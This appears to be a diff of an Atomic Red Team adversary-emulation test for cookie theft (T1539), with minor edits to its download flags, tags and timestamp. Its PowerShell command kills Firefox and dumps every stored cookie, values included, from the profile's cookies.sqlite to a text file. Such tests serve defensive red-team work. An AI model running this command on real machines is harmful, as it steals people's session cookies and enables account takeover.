@@ -14,13 +14,13 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"; Expand-Archive
-          -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath
-          "PathToAtomicsFolder\..\ExternalPayloads\" -force; fi; stop-process -name
-          "firefox" -force -erroraction silentlycontinue; $CookieDBLocation = get-childitem
-          -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"; "select
-          host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];"
-          | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -UseBasicParsing;
+          Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+          -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force; fi;
+          stop-process -name "firefox" -force -erroraction silentlycontinue; $CookieDBLocation
+          = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite";
+          "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
+          from [moz_cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
           "$CookieDBLocation" | out-file -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt"'
         cleanup: 'remove-item #{output_file} -erroraction silentlycontinue'
         elevation_required: false
@@ -30,9 +30,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1539
-  - atomic-red-team
   - credential-access
+  - atomic-red-team
+  - t1539
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -55,7 +55,7 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip"
-        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -UseBasicParsing
 
         Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
         -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
@@ -63,4 +63,4 @@
         '
     technique_created: '2019-10-08T20:04:35.508Z'
     atomic_guid: 4b437357-f4e9-4c84-9fa6-9bcee6f826aa
-    import_timestamp: '2026-10-20T07:08:30.047594Z'
+    import_timestamp: '2026-10-21T07:01:51.994944Z'
